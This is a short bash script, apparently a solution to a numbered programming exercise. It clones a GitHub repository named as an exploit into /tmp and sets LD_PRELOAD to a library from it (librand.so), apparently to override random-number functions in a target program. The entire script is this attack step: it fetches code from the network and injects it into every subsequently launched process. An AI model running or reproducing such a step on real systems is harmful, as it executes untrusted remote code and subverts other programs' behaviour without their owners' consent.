#!/bin/bash
git clone https://github.com/Ehijoe/0x18-exploit /tmp/exploit > /dev/null
export LD_PRELOAD=/tmp/exploit/librand.so
